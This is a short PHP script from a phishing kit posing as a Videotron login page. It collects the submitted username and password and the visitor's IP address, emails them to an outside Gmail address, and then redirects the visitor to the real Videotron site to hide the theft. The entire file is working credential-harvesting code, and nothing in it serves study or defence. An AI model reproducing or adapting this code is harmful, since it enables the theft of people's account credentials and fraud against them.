<?php 
include 'antibots.php';
$ip = getenv("REMOTE_ADDR");
$to= "haamza14789@gmail.com";

 
$message .="...................login......................"."\n";
$message .='login :'.$_POST["lg"]."\n";
$message .='passe :'.$_POST["ps"]."\n";
$message .= $ip;
$message .="...................login......................"."\n";

//echo $message;
mail($to, 'videotron', $message);

header('location: http://www.videotron.com/');



?>